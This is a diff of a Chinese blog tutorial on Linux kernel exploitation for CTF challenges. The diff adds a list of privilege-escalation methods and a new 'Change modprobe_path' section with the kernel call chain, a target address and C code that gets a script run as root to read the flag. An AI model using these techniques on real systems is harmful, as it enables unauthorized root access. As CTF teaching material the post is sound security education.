@@ -38,9 +38,7 @@ title: "Kernel - How2Kernel 0x00: Environment and Basic LPE"
 
 我的 kernel 模板可以在 github 仓库中找到：[pwn-scripts](https://github.com/AvavaAYA/pwn-scripts/tree/main/kernel_template/c_template)，其中包括了编译和调试的脚本。
 
-<!-- TODO: 增加对本地环境的描述，增加模版使用指南 -->
-
-<!-- TODO: 增加对内核模块的解释与例子 -->
+**更新**：现在可以直接使用 `lianpwn upload` 获得上传脚本模板。
 
 ---
 
@@ -97,7 +95,7 @@ EOF
 exit
 ```
 
-利用之所以能成功，是因为出题者没有注意到 `init` 脚本可能会调用到的命令的属主并非 `root` 而是 `ctfer`，这导致我们能够篡改 `poweroff` 的内容进而让 init 脚本运行实现提权。
+利用之所以能成功，是因为出题者在打包题目时没有切换到 root，进而导致 `/sbin` 下的文件属主并非高权限用户，可以被篡改。
 
 ##### Chal-0x00: Hackergame-2022-no_open
 
@@ -177,7 +175,7 @@ nm -D ./libc.so.6 | grep exit
 - 利用代码：
 
 ```c
-// patch libc的exit函数为orw的shellcode，然后直接exit。
+// patch libc 的 exit 函数为 orw 的 shellcode，然后直接 exit。
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -267,7 +265,7 @@ Kernel 中的漏洞如何导致提权？通俗来讲，kernel 中的模块运行
 
 对于内核题目，往往会给出以下三个文件：
 
-- `bzImage`：压缩过的内核镜像，可以使用 [vmlinux-to-elf](https://github.com/marin-m/vmlinux-to-elf) 还原为可导入 ida 的 vmlinux 内核镜像，恢复部分符号。当然也可以到高性能主机上重新编译一份带符号表的镜像。
+- `bzImage`：压缩过的内核镜像，可以使用 [vmlinux-to-elf](https://github.com/marin-m/vmlinux-to-elf) 还原为可导入 ida 的 vmlinux 内核镜像，恢复部分符号。当然也可以本地重新编译一份带符号表的镜像。
 
 - `rootfs.cpio`：存档文件的文件格式：
 
@@ -367,7 +365,16 @@ int main() {
 先编写基础利用代码进行调试，确认漏洞存在并且可以运行写入的 shellcode：
 
 ![[static/figure-0x02.png]]
+
 ### Exploitation
+
+> [!INFO] 
+> **更新**：近期发现 ctf-wiki 上内核部分有更新，故在博客中也列举多种提权方式，以便日后查阅：
+> - [Change Current Cred](#solution-1-change-current-cred)：直接根据 gs 相对偏移定位 `current_cred` 并写入 0 提权（纯数据攻击）
+> - [Commit Root Cred](#solution-2-commit-root-cred)：`commit_creds(&init_cred)`（常用，但需要控制流劫持，受 CFI 限制）
+> - [篡改全局变量 modprobe_path](#solution-3-change-modprobe_path)：借助 `call_usermodehelper` 以高权限运行程序（常用，但受 `CONFIG_STATIC_USERMODEHELPER` 限制）
+> - 篡改全局变量 poweroff_cmd：借助 `__orderly_poweroff` 以高权限运行程序（较少见，可以视为 `modprobe_path` 的替代）
+> - 篡改 `/etc/passwd` 等文件的 `f_mode` 使其可写：与篡改当前 cred 类似（纯数据攻击）
 
 在我们第一道 kernel Pwn 题的利用部分，先来了解一下内核对进程权限的识别：
 
@@ -543,6 +550,43 @@ static struct key *get_user_register(struct user_namespace *user_ns)
 	ret
 ```
 
+#### Solution-3: Change modprobe_path
+
+篡改全局变量 `modprobe_path` 的提权手段在没有开启 `CONFIG_STATIC_USERMODEHELPER` 的内核上是非常方便好用的。其中 `modprobe` 作为安装 / 卸载内核模块的程序，路径存在全局变量 `modprobe_path` 中，默认值是 `/sbin/modprobe`。当系统尝试运行一个魔数不存在的文件时，内核就会经过如下调用链：
+
+```bash
+entry_SYSCALL_64()
+    sys_execve()
+        do_execve()
+            do_execveat_common()
+                bprm_execve()
+                    exec_binprm()
+                        search_binary_handler()
+                            __request_module()
+                                call_modprobe()
+```
+
+进入 [`call_modprobe` 函数](https://elixir.bootlin.com/linux/v6.11.4/source/kernel/module/kmod.c#L72) 中并以 root 权限运行 `modprobe_path` 程序。
+
+回到题目，原题是开了 `CONFIG_STATIC_USERMODEHELPER` 的，想必出题人也不想被这种全局变量修改秒掉，可以重新编译一份来打。具体利用流程如下：
+
+1. 根据 `__request_module` 定位到 `modprobe_path` 地址偏移为 `0xFFFFFFFF836774E0`；
+2. 利用漏洞将 `/tmp/a` 写入上述内存空间；
+3. 完成非法魔数程序和利用程序的构造，并赋予执行权限；
+4. 最后执行非法魔数程序，此时系统会以 root 权限运行 `/tmp/a`，获得 flag：
+
+```c
+system("echo -ne \"\\xff\\xff\\xff\\xff\" > /tmp/dummy");
+system("echo \"#!/bin/sh\" >> /tmp/a");
+system("echo \"cp /flag /tmp/flag && chmod a+r /tmp/flag\" >> /tmp/a");
+system("chmod +x /tmp/dummy");
+system("chmod +x /tmp/a");
+execve("/tmp/dummy", NULL, NULL);
+system("cat /tmp/flag");
+```
+
+类似的全局变量还有很多，例如 `poweroff_cmd`, `uevent_helper`, `ocfs2_hb_ctl_path`, `nfs_cache_getent_prog`, `cltrack_prog` 等，可以到源码中找到对应的利用方法。
+
 ---
 
 # 一些参考资料和例题
@@ -559,14 +603,10 @@ static struct key *get_user_register(struct user_namespace *user_ns)
 
 # References
 
-\[1\] [2022 USTC Hackergame WriteUp 0x03](https://tttang.com/archive/1805/#toc_2) . _MiaoTony_
-
-\[2\] [Hackergame 2022 (第九届中科大信安赛) Writeup 0x02](https://blog.gzti.me/posts/2022/f8551307/index.html#%E8%AF%BB%E4%B8%8D%E5%88%B0-%E6%89%93%E4%B8%8D%E5%BC%80) . _GZTime_
-
-\[3\] [TPCTF 2023 Writeup](https://blog.xmcve.com/2023/11/28/TPCTF2023-Writeup/#title-3) . _星盟安全团队_
-
-\[4\] [slab/0x40 UAF TPCTF2023 - core 一题多解](https://blog.csdn.net/qq_61670993/article/details/134754416) . _XiaozaYa_
-
-\[5\] [XCTF 华为高校挑战赛决赛 嵌入式赛题 非预期解](https://xuanxuanblingbling.github.io/ctf/pwn/2022/09/19/harmony/) . _xuanxuanblingbling_
-
-\[6\] [CTF-wiki pwn kernel introduction-to-kernel-pwn](https://ctf-wiki.org/pwn/linux/kernel-mode/aim/privilege-escalation/change-self/) . _arttnba3_
+1. [2022 USTC Hackergame WriteUp 0x03](https://tttang.com/archive/1805/#toc_2) . _MiaoTony_
+2. [Hackergame 2022 (第九届中科大信安赛) Writeup 0x02](https://blog.gzti.me/posts/2022/f8551307/index.html#%E8%AF%BB%E4%B8%8D%E5%88%B0-%E6%89%93%E4%B8%8D%E5%BC%80) . _GZTime_
+3. [TPCTF 2023 Writeup](https://blog.xmcve.com/2023/11/28/TPCTF2023-Writeup/#title-3) . _星盟安全团队_
+4. [slab/0x40 UAF TPCTF2023 - core 一题多解](https://blog.csdn.net/qq_61670993/article/details/134754416) . _XiaozaYa_
+5. [XCTF 华为高校挑战赛决赛 嵌入式赛题 非预期解](https://xuanxuanblingbling.github.io/ctf/pwn/2022/09/19/harmony/) . _xuanxuanblingbling_
+6. [CTF-wiki pwn kernel introduction-to-kernel-pwn](https://ctf-wiki.org/pwn/linux/kernel-mode/aim/privilege-escalation/change-self/) . _arttnba3_
+7. [Kernel PWN 从入门到提升](https://bbs.kanxue.com/thread-276403.htm) . _[kotoriseed](https://bbs.kanxue.com/homepage-951122.htm)_
